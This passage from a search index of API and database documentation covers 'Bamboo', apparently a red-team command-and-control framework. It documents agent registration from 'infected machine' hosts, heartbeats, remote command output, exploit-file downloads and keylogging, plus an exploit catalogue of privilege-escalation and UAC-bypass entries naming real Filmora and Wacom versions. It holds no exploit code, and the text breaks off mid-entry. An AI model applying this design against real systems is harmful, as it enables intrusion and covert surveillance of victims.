Return","text":"Type Description Dictionary Success Dictionary Failed"},{"location":"Database/model_agents.html#return-example_7","title":"Return Example","text":"Text Only<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Database/model_agents.html#info_status","title":"info_status","text":"<p>Retrieve and update database (if needed) of Bamboo Agent status when {command <code>info</code>} is called</p>"},{"location":"Database/model_agents.html#usage_9","title":"Usage","text":"Text Only<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Database/model_agents.html#description_9","title":"Description","text":"<p>info_status main objective is to return the status of the specified Bamboo Agent. This model will check if the specified Bamboo Agent is \"dead\" by comparing the <code>current timestamp</code> with the <code>expected timestamp</code> before returning the status of the specified Bamboo Agent.</p>"},{"location":"Database/model_agents.html#function-arguments_9","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example_6","title":"Arguments Example","text":"Text Only<pre><code>info_status(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_9","title":"Database Method","text":"Method Collection Return find_one heartbeats List of information of specified Bamboo Agent"},{"location":"Database/model_agents.html#find-return-example","title":"Find Return Example","text":"Text Only<pre><code>[\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"alive\"\n]\n</code></pre>"},{"location":"Database/model_agents.html#function-return_9","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver on specified Bamboo Agent status"},{"location":"Database/model_agents.html#return-example_8","title":"Return Example","text":"Text Only<pre><code>{\"agent_status\": \"alive\"}\n</code></pre>"},{"location":"Database/model_agents.html#remove_inactive","title":"remove_inactive","text":"<p>Remove all \"dead\" registered Bamboo Agent from the database</p>"},{"location":"Database/model_agents.html#usage_10","title":"Usage","text":"Text Only<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Database/model_agents.html#description_10","title":"Description","text":"<p>remove_inactive is used in the function that automatically remove data from the database. This model will help the function to automatically remove all \"dead\" Bamboo Agent from the database.</p>"},{"location":"Database/model_agents.html#function-arguments_10","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_agents.html#database-method_10","title":"Database Method","text":"Method Collection Return find heartbeats List of information of \"dead\" Bamboo Agents"},{"location":"Database/model_agents.html#function-return_10","title":"Function Return","text":"Type Description Dictionary List of \"dead\" Bamboo Agent"},{"location":"Database/model_agents.html#return-example_9","title":"Return Example","text":"Text Only<pre><code>[\n    [   \n        \"agent_identifier\": \"5zrire9a\",\n        \"heartbeat\": 6,\n        \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n        \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n        \"status\": \"dead\"\n    ],\n    [   \n        \"agent_identifier\": \"wohw193j\",\n        \"heartbeat\": 9,\n        \"current_time\": \"2024-07-30T16:42:20.653+00:00\",\n        \"expected_time\": \"2024-07-30T16:42:29.653+00:00\",\n        \"status\": \"dead\"\n    ]\n]\n</code></pre>"},{"location":"Database/model_auth.html","title":"Model auth","text":""},{"location":"Database/model_auth.html#model-class-authentication","title":"Model Class - authentication","text":"<p>This class contains all models that will be related to authentication. Therefore, it will only use the find method as the other methods are not needed for authentication related actions. This class will be interacting with the <code>user collection</code> and the <code>heartbeats collection</code>.</p>"},{"location":"Database/model_auth.html#login_auth","title":"login_auth","text":"<p>Authenticates Bamboo Client user credentials</p>"},{"location":"Database/model_auth.html#usage","title":"Usage","text":"Text Only<pre><code>POST /auth/login\n</code></pre>"},{"location":"Database/model_auth.html#description","title":"Description","text":"<p>login_auth will be called everytime a Bamboo Client user wants to log in. This model will first determine if the username exist in the <code>collection users</code>. If it exist, it will then compare between the password one provided by the user and the password in the database and return the status accordingly. </p>"},{"location":"Database/model_auth.html#function-arguments","title":"Function Arguments","text":"Field Type Description username String Username input by user password String Password input by user"},{"location":"Database/model_auth.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>login_auth(\"bambooUser\", \"adnap\")\n</code></pre>"},{"location":"Database/model_auth.html#database-method","title":"Database Method","text":"Method Collection Return find_one user List of specified user information"},{"location":"Database/model_auth.html#find-example","title":"Find Example","text":"Text Only<pre><code>[\n    \"username\": \"bambooUser\",\n    \"password\": \"adnap\",\n    \"status\": \"offline\"\n]\n</code></pre>"},{"location":"Database/model_auth.html#function-return","title":"Function Return","text":"Type Description String Notify Bamboo Teamserver of status"},{"location":"Database/model_auth.html#return-example","title":"Return Example","text":"Text Only<pre><code>Welcome\n</code></pre> Text Only<pre><code>Invalid-User\n</code></pre>"},{"location":"Database/model_auth.html#obtain_status","title":"obtain_status","text":"<p>Helps Bamboo Teamserver to determine spe</p>"},{"location":"Database/model_auth.html#usage_1","title":"Usage","text":"Text Only<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Database/model_auth.html#description_1","title":"Description","text":"<p>obtain_status helps Bamboo Teamserver to obtain the status of the specified Bamboo Agent in the <code>collection heartbeats</code>. This is used when Bamboo Client user want to use a command that requires the Bamboo Agent to be \"alive\". It only returns that Bamboo Agent status.</p>"},{"location":"Database/model_auth.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_auth.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>obtain_status(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_auth.html#database-method_1","title":"Database Method","text":"Method Collection Return find heartbeats List of specified Bamboo Agent information"},{"location":"Database/model_auth.html#find-example_1","title":"Find Example","text":"Text Only<pre><code>[   \n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"dead\"\n]\n</code></pre>"},{"location":"Database/model_auth.html#function-return_1","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver of Bamboo Agent status"},{"location":"Database/model_auth.html#return-example_1","title":"Return Example","text":"Text Only<pre><code>\"agent_status\": \"alive\"\n</code></pre>"},{"location":"Database/model_exploits.html","title":"Model exploits","text":""},{"location":"Database/model_exploits.html#model-class-expoits","title":"Model Class - expoits","text":"<p>This class contains all models related to exploits. Bamboo Teamserver make use of the functions within this class to find, update, add, and delete exploits information stored in the database according to Bamboo Client command. This class will be interacting with the <code>exploits collection</code> only</p>"},{"location":"Database/model_exploits.html#view_all","title":"view_all","text":"<p>Retrieve all exploits information</p>"},{"location":"Database/model_exploits.html#usage","title":"Usage","text":"Text Only<pre><code>POST /exploits/view_all\n</code></pre>"},{"location":"Database/model_exploits.html#description","title":"Description","text":"<p>view_all retrieves all exploits information stored in the database from the <code>exploits collection</code>.</p>"},{"location":"Database/model_exploits.html#function-arguments","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_exploits.html#database-method","title":"Database Method","text":"Method Collection Return find exploits Dictionary of all exploit information in the collection"},{"location":"Database/model_exploits.html#function-return","title":"Function Return","text":"Type Description List List of all exploit information in the collection"},{"location":"Database/model_exploits.html#return-example","title":"Return Example","text":"Text Only<pre><code>[\n  {\n    \"name\": \"filmora.exe\",\n    \"app_version\": \"Wondershare Filmora v11\",\n    \"LPE_start\": \"admin\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": true,\n    \"drop-to-disk\": true,\n    \"inject\": true,\n    \"drop_file\": \"filmora.exe\"\n  },\n  {\n    \"name\": \"wacom.exe\",\n    \"app_version\": \"Wacom Tablet 6.3.45-1\",\n    \"LPE_start\": \"user\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": false,\n    \"drop-to-disk\": true,\n    \"inject\": true,\n    \"drop_file\": \"\"\n  }\n]\n</code></pre>"},{"location":"Database/model_exploits.html#add_exploit","title":"add_exploit","text":"<p>Insert new exploit into database</p>"},{"location":"Database/model_exploits.html#usage_1","title":"Usage","text":"Text Only<pre><code>POST /exploits/add\n</code></pre>"},{"location":"Database/model_exploits.html#description_1","title":"Description","text":"<p>Insert a new exploit into the database <code>collection exploits</code>.</p>"},{"location":"Database/model_exploits.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description configuration String List of new exploit information"},{"location":"Database/model_exploits.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>add_exploit([\"newExploit.exe\", \"app_version_Bamboo\", \"user\", \"system\", False, True, True, \"\"])\n</code></pre>"},{"location":"Database/model_exploits.html#database-method_1","title":"Database Method","text":"Method Collection Return insert_one exploits Dictionary exploit information to be added"},{"location":"Database/model_exploits.html#insert-example","title":"Insert Example","text":"Text Only<pre><code>new_exploit = {\n    \"name\": \"newExploit.exe\",\n    \"app_version\": \"app_version_Bamboo\",\n    \"LPE_start\": \"user\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": False,\n    \"drop-to-disk\": True,\n    \"inject\": True,\n    \"drop_file\": \"\"\n}\n</code></pre>"},{"location":"Database/model_exploits.html#function-return_1","title":"Function Return","text":"Type Description Boolean Status of insertion"},{"location":"Database/model_exploits.html#return-example_1","title":"Return Example","text":"Text Only<pre><code>True\n</code></pre>"},{"location":"Database/model_exploits.html#del_exploit","title":"del_exploit","text":"<p>Delete sepcified exploit from database</p>"},{"location":"Database/model_exploits.html#usage_2","title":"Usage","text":"Text Only<pre><code>POST /exploits/delete\n</code></pre>"},{"location":"Database/model_exploits.html#description_2","title":"Description","text":"<p>Delete an existing exploit from the database <code>collection exploits</code>.</p>"},{"location":"Database/model_exploits.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit to be deleted"},{"location":"Database/model_exploits.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>del_exploit(\"wacom.exe\")\n</code></pre>"},{"location":"Database/model_exploits.html#database-method_2","title":"Database Method","text":"Method Collection Return find_one exploits List of information of specified exploit, None of does not exist delete_many exploits Delete all instance of specified exploit name"},{"location":"Database/model_exploits.html#function-return_2","title":"Function Return","text":"Type Description Dictionary Status of deletion"},{"location":"Database/model_exploits.html#return-example_2","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Database/model_exploits.html#find_one","title":"find_one","text":"<p>Retrieve information of a specified exploit</p>"},{"location":"Database/model_exploits.html#usage_3","title":"Usage","text":"Text Only<pre><code>POST /exploits/exist\n</code></pre>"},{"location":"Database/model_exploits.html#description_3","title":"Description","text":"<p>Retrieve all information regarding the specified exploit from the <code>collection exploits</code>.</p>"},{"location":"Database/model_exploits.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit"},{"location":"Database/model_exploits.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>find_one(\"wacom.exe\")\n</code></pre>"},{"location":"Database/model_exploits.html#database-method_3","title":"Database Method","text":"Method Collection Return find_one exploits List of information of specified exploit, None of does not exist"},{"location":"Database/model_exploits.html#function-return_3","title":"Function Return","text":"Type Description Dictionary Status of retrieving, list of data if applicable"},{"location":"Database/model_exploits.html#return-example_3","title":"Return Example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"data\": [\n        \"name\": \"wacom.exe\",\n        \"app_version\": \"Wacom Tablet 6.3.45-1\",\n        \"LPE_start\": \"user\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": false,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"\"\n    ]\n}\n</code></pre>"},{"location":"Database/model_exploits.html#modify","title":"modify","text":"<p>Modify specified exploit information (for Bamboo Client CLI)</p>"},{"location":"Database/model_exploits.html#usage_4","title":"Usage","text":"Text Only<pre><code>POST /exploits/modify\n</code></pre>"},{"location":"Database/model_exploits.html#description_4","title":"Description","text":"<p>Modidy information of exploit specified in <code>collection exploits</code>. Changes to be made will differ, therefore this model can dynamically modify the number of changes to be made accordingly.</p>"},{"location":"Database/model_exploits.html#function-arguments_4","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit to be modified changes List List of changes to be made (differ accordingly)"},{"location":"Database/model_exploits.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>modify(\"wacom.exe\", [\"name\": \"wacow.exe\"])\n</code></pre>"},{"location":"Database/model_exploits.html#database-method_4","title":"Database Method","text":"Method Collection Return update_many exploits Status of update"},{"location":"Database/model_exploits.html#update-example","title":"Update Example","text":"Text Only<pre><code>{\n    \"name\": exploit_name\n}, \n{\"$set\": \n    {key: new_value}\n}\n</code></pre>"},{"location":"Database/model_exploits.html#function-return_4","title":"Function Return","text":"Type Description Boolean Status of update"},{"location":"Database/model_exploits.html#return-example_4","title":"Return Example","text":"Text Only<pre><code>True\n</code></pre>"},{"location":"Database/model_exploits.html#modify_gui","title":"modify_gui","text":"<p>Modify specified exploit information (for Bamboo Client GUI)</p>"},{"location":"Database/model_exploits.html#usage_5","title":"Usage","text":"Text Only<pre><code>POST /exploits/modify_gui\n</code></pre>"},{"location":"Database/model_exploits.html#description_5","title":"Description","text":"<p>Modidy information of exploit specified in <code>collection exploits</code>. Unlike the previous model, this model caters for the GUI, which will update all information of the specified exploit even if there are still the same.</p>"},{"location":"Database/model_exploits.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description modified_exploit_name String Name of exploit to be modified new_name String Name to replace with new_app_version String App version to be replace with new_LPE_start String LPE start to be replace with new_LPE_end String LPE end to be replace with new_uac_bypass Boolean Uac_bypass to be replace with new_d2d Boolean Drop-to-disk to be replace with new_inj Boolean Injection to be replace with new_dropfile String Dropfile to be replace with"},{"location":"Database/model_exploits.html#arguments-example_4","title":"Arguments Example","text":"Text Only<pre><code>modify_gui(\"wacom.exe\", \"wacow.exe\", \"Wacom Tablet 6.3.45-1\", \"admin\", \"system\", \"true\", \"true\", \"false\", \"wacow.exe\")\n</code></pre>"},{"location":"Database/model_exploits.html#database-method_5","title":"Database Method","text":"Method Collection Return update_many exploits Status of update"},{"location":"Database/model_exploits.html#update-example_1","title":"Update Example","text":"Text Only<pre><code>{\n    \"name\": exploit_name\n}, \n{\"$set\": \n    {\n        \"name\": new_name,\n        \"app_version\": new_app_version,\n        \"LPE_start\": new_LPE_start,\n        \"LPE_end\": new_LPE_end,\n        \"uac_bypass\": new_uac_bypass,\n        \"drop-to-disk\": new_d2d,\n        \"inject\": new_inj,\n        \"drop_file\": new_dropfile\n    }\n}\n</code></pre>"},{"location":"Database/model_exploits.html#function-return_5","title":"Function Return","text":"Type Description Boolean Status of update"},{"location":"Database/model_exploits.html#return-example_5","title":"Return Example","text":"Text Only<pre><code>True\n</code></pre>"},{"location":"Database/model_users.html","title":"Model users","text":""},{"location":"Database/model_users.html#model-class-users","title":"Model Class - users","text":"<p>This class contains all models related to users. Bamboo Teamserver will make use of the functions within this class to find, update, add, and delete user information stored in the database according to Bamboo Client command. This class will be interacting with the <code>user collection</code> only</p>"},{"location":"Database/model_users.html#view_users","title":"view_users","text":"<p>Retrieve all users information</p>"},{"location":"Database/model_users.html#usage","title":"Usage","text":"Text Only<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Database/model_users.html#description","title":"Description","text":"<p>view_users retrieves all user information stored in the database from the <code>user collection</code>. After retrieving the information, the model will delete the password column, making only the username and status return.</p>"},{"location":"Database/model_users.html#function-arguments","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_users.html#database-method","title":"Database Method","text":"Method Collection Return find user List of user information excluding password"},{"location":"Database/model_users.html#function-return","title":"Function Return","text":"Type Description List List of all user information excluding password"},{"location":"Database/model_users.html#return-example","title":"Return Example","text":"Text Only<pre><code>[\n    [\n        \"bambooUser\",\n        \"offline\"\n    ],\n    [\n        \"bambooUserTwo\",\n        \"online\"\n    ]\n]\n</code></pre>"},{"location":"Database/model_users.html#user_online","title":"user_online","text":"<p>Updates user status to online</p>"},{"location":"Database/model_users.html#usage_1","title":"Usage","text":"Text Only<pre><code>POST /auth/login\n</code></pre>"},{"location":"Database/model_users.html#description_1","title":"Description","text":"<p>When a Bamboo Client user log ins, Bamboo Teamserver will call this model to update the username status to \"online\" in the <code>user collection</code>.</p>"},{"location":"Database/model_users.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description username String Username of Bamboo Client user"},{"location":"Database/model_users.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>user_online(\"bambooUser\")\n</code></pre>"},{"location":"Database/model_users.html#database-method_1","title":"Database Method","text":"Method Collection Return update_many user Status of update"},{"location":"Database/model_users.html#update-example","title":"Update Example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\"\n}, \n{\"$set\": \n    {\n        \"status\": \"online\"\n    }\n}\n</code></pre>"},{"location":"Database/model_users.html#function-return_1","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Database/model_users.html#return-example_1","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Database/model_users.html#user_offline","title":"user_offline","text":"<p>Updates user status to offline</p>"},{"location":"Database/model_users.html#usage_2","title":"Usage","text":"Text Only<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Database/model_users.html#description_2","title":"Description","text":"<p>When a Bamboo Client user log outs, Bamboo Teamserver will call this model to update the username status to \"offline\" in the <code>user collection</code>.</p>"},{"location":"Database/model_users.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description username String Username of Bamboo Client user"},{"location":"Database/model_users.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>user_offline(\"bambooUser\")\n</code></pre>"},{"location":"Database/model_users.html#database-method_2","title":"Database Method","text":"Method Collection Return update_many user Status of update"},{"location":"Database/model_users.html#update-example_1","title":"Update Example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUser\"\n}, \n{\"$set\": \n    {\n        \"status\": \"offline\"\n    }\n}\n</code></pre>"},{"location":"Database/model_users.html#function-return_2","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Database/model_users.html#return-example_2","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Database/model_users.html#register_user","title":"register_user","text":"<p>Insert new user into the database</p>"},{"location":"Database/model_users.html#usage_3","title":"Usage","text":"Text Only<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Database/model_users.html#description_3","title":"Description","text":"<p>register_user is called when the Bamboo Client wants to register a set of new credentials into Bamboo Teamserver in the <code>user collection</code></p>"},{"location":"Database/model_users.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description username String New username password String New password"},{"location":"Database/model_users.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>register_user(\"bambooUserNew\", \"paSsWOrd@111\")\n</code></pre>"},{"location":"Database/model_users.html#database-method_3","title":"Database Method","text":"Method Collection Return insert_one user Status of insertion"},{"location":"Database/model_users.html#insert-example","title":"Insert Example","text":"Text Only<pre><code>{\n    \"username\": \"bambooUserNew\",\n    \"password\": \"paSsWOrd\"@111,\n    \"status\": \"offline\"\n}\n</code></pre>"},{"location":"Database/model_users.html#function-return_3","title":"Function Return","text":"Type Description Boolean Status of insertion"},{"location":"Database/model_users.html#return-example_3","title":"Return Example","text":"Text Only<pre><code>True\n</code></pre>"},{"location":"Database/model_users.html#delete_user","title":"delete_user","text":"<p>Remove existing user from the database</p>"},{"location":"Database/model_users.html#usage_4","title":"Usage","text":"Text Only<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Database/model_users.html#description_4","title":"Description","text":"<p>delete_user is called when a Bamboo Client wants to remove a set of credentials from Bamboo Teamserver, <code>user collection</code>. Before deleting the credential, the model will determine if the username given exist, if it exist, Bamboo Teamserver will delete that set of credential.</p>"},{"location":"Database/model_users.html#function-arguments_4","title":"Function Arguments","text":"Field Type Description username String Username to delete"},{"location":"Database/model_users.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>delete_user(\"bambooUserNew\")\n</code></pre>"},{"location":"Database/model_users.html#database-method_4","title":"Database Method","text":"Method Collection Return find_one user Determine if the username exist delete_many user Delete credentials from the database"},{"location":"Database/model_users.html#function-return_4","title":"Function Return","text":"Type Description Dictionary Status of insertion"},{"location":"Database/model_users.html#return-example_4","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Database/model_users.html#find_one","title":"find_one","text":"<p>Retrieve a specific user information</p>"},{"location":"Database/model_users.html#usage_5","title":"Usage","text":"Text Only<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Database/model_users.html#description_5","title":"Description","text":"<p>find_one main objective is to determine if a username exist in the database. It will determine if the user exist in the database, <code>user collection</code>, before returning the status back to Bamboo Teamserver.</p>"},{"location":"Database/model_users.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description username String Username to find"},{"location":"Database/model_users.html#arguments-example_4","title":"Arguments Example","text":"Text Only<pre><code>find_one(\"bambooUserNew\")\n</code></pre>"},{"location":"Database/model_users.html#database-method_5","title":"Database Method","text":"Method Collection Return find_one user Determine if the username exist"},{"location":"Database/model_users.html#function-return_5","title":"Function Return","text":"Type Description Dictionary Existence of user"},{"location":"Database/model_users.html#return-example_5","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html","title":"/agent","text":""},{"location":"Teamserver_API_Reference/agent.html#agent-heartbeats","title":"Agent Heartbeats","text":"<p>Record Bamboo Agent heartbeat</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /agent/heartbeat\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description","title":"Description","text":"<p>Agent heartbeats endpoint is for Bamboo Agents to 'ping' after their initial connection. This API helps determine if a Bamboo Agent is still 'alive' and running. Heartbeat, is a mechanism used in Bamboo to ensure that an individual Bamboo Agent is still 'alive' and running. The initial connection will give Bamboo Agents 5 seconds before the next heartbeat is expected. After that, the Bamboo Agent will continue sending their heartbeat at random between 5 to 10 seconds. This endpoint will use the <code>model add_heartbeat</code> to repeatedly update the <code>collection heartbeats</code>.</p> <p>After obtaining the 2 data in the request body from Bamboo Agent, Bamboo Teamserver will take the time that the request was made and compare it with the expected_heartbeat column in the database. Refer to db collection heartbeats for more information.</p> <p>If the current time is later than the expected time, it would mean that the Bamboo Agent was 'dead' and it became 'alive' after a while. While if the current time matches the expected time for the next heartbeat, it would mean that the Bamboo Agent is 'punctual' and still alive.</p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent heartbeat Integer Seconds before the next heartbeat"},{"location":"Teamserver_API_Reference/agent.html#request-example","title":"Request example","text":"Text Only<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 8\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"alive\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver_API_Reference/agent.html#response-example","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#registering-agent","title":"Registering Agent","text":"<p>Register new Bamboo Agent</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_1","title":"Description","text":"<p>The Register Agent endpoint is called when a Bamboo Agent is executed. The Bamboo Agent will request for this endpoint to register itself into Bamboo Teamserver and using the <code>model check_agent_identifier</code>, Bamboo Teamserver will be able to generate unique agent identifiers and avoid duplicates.</p> <p>Bamboo Teamserver will create a new unique agent identifier for all Bamboo Agent. Once the agent identifier is created, Bamboo Teamserver will update the database in the <code>agents collection</code> using  the <code>model add_agent</code> with the new Bamboo Agent information. Not only that, also update the <code>heartbeat collection</code> using the <code>model add_heartbeat</code> and give the agent 5 seconds buffer time to request for the next heartbeat. For more details for the collections, do refer here for the <code>heartbeat collection</code> and here for the agents collection.</p> <p>After the procedure is completed, Bamboo Teamserver will broadcast to all connected Bamboo Clients that a new Bamboo Agent is connected, with its agent identifier. From there, Bamboo Client users will be able to interact and view the information using commands. For more information on commands, do refer to command.</p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema_1","title":"Request schema","text":"Request body Field Type Description hostname String Hostname if infected machine publicIP String Public IP address of infected machine privateIP String Private IP address of infected machine Integrity String Privilege level of Bamboo Agent"},{"location":"Teamserver_API_Reference/agent.html#request-example_1","title":"Request example","text":"Text Only<pre><code>{\n    \"hostname\": \"bambooMachine\",\n    \"publicIP\": \"39.100.49.231\",\n    \"privateIP\": \"192.168.45.7\",\n    \"Integrity\": \"medium\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_1","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"listener_status\": \"connected\", \"agent_identifier\", \"5zrire9a\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver_API_Reference/agent.html#response-example_1","title":"Response example","text":"Text Only<pre><code>{\n    \"listener_status\": \"connected\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#command-response","title":"Command Response","text":"<p>Store response of command for <code>cmd</code> Bamboo Client command</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /agent/agent_response\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_2","title":"Description","text":"<p>Command Response endpoint is part of the {<code>cmd</code> command} component. This endpoint receives the response of the Bamboo Agent after the Bamboo Client user sends a command over. Bamboo Teamserver will then update a dictionary in the global variable for /handler/handler_output API to receive it, which details are in here. </p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema_2","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent response String Result of command (e.g. <code>whoami</code>)"},{"location":"Teamserver_API_Reference/agent.html#request-example_2","title":"Request example","text":"Text Only<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_2","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"status\": \"success\", \"response\", \"bambooMachine\\panda\"} Success <code>404</code> {\"message\": \"Invalid Body\"} Invalid Body"},{"location":"Teamserver_API_Reference/agent.html#response-example_2","title":"Response example","text":"Text Only<pre><code>{\n    \"status\": \"success\",\n    \"response\": \"bambooMachine\\panda\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#file-download","title":"File Download","text":"<p>Download exploit files by name</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>GET /agent/download/&amp;lt;filename&amp;gt;\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_3","title":"Description","text":"<p>During exploiting phrase, if drop file is required, Bamboo Agent will request for this API to download the exploit file. All exploit files is located in <code>/exploits</code> folder</p>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_3","title":"Response schema","text":"Status Code Schema Description <code>200</code> File Success <code>404</code> Null Invalid Body"},{"location":"Teamserver_API_Reference/agent.html#keylog-result","title":"Keylog Result","text":"<p>Store post exploit (<code>keylog</code>) result (keystrokes)</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_4","title":"Endpoint","text":"Text Only<pre><code>POST /agent/post_exploit/keylog\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#description_4","title":"Description","text":"<p>Keylog Result will be called by Bamboo Agent when Bamboo Client command the Bamboo Agent to stop recording keystrokes. There will be error checking to determine if there were any error, if there are no errors, Bamboo Teamserver will send the keystroke to the user via WebSocket.</p>"},{"location":"Teamserver_API_Reference/agent.html#request-schema_3","title":"Request schema","text":"Request body Field Type Description agent_identifier String Identifier of Bamboo Agent status String State of agent: <code>done</code>, <code>start</code>, <code>error</code> keystroke String Key strokes recorded handler String Bamboo Client user that started the keylogging error String If status is error, will state error"},{"location":"Teamserver_API_Reference/agent.html#request-example_3","title":"Request example","text":"Text Only<pre><code>{\n    \"agent_identifier\": \"5zrire9a\",\n    \"status\": \"done\":,\n    \"keystroke\": \"keystrokesrecorded\",\n    \"handler\": \"Bamboo User A\",\n    \"error\": \"\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#response-schema_4","title":"Response schema","text":"Status Code Schema Description <code>200</code> {\"message\": \"success\"} Successfully sent broadcasted to Bamboo Client <code>400</code> {\"message\": \"failed\"} Failed to broadcast to Bamboo Client <code>404</code> {\"message\": \"error\"} There was an error when logging keystrokes"},{"location":"Teamserver_API_Reference/agent.html#response-example_3","title":"Response example","text":"Text Only<pre><code>{\n    \"message\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#websocket-schema","title":"WebSocket schema","text":"Websocket body Field Type Description keylogMsg String Keystrokes recorded agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver_API_Reference/agent.html#websocket-example","title":"WebSocket example","text":"Text Only<pre><code>{\n    \"keylogMsg\": \"keystrokesrecorded\",\n    \"agent_identifier\": \"5zrire9a\"\n}\n</code></pre>"},{"location":"Teamserver_API_Reference/agent.html#enumerate-result","title":"Enumerate Result","text":"<p>Store enumeration (<code>enum</code>) result</p>"},{"location":"Teamserver_API_Reference/agent.html#endpoint_5","title":"Endpoint","text":"Text Only<pre><code>POST 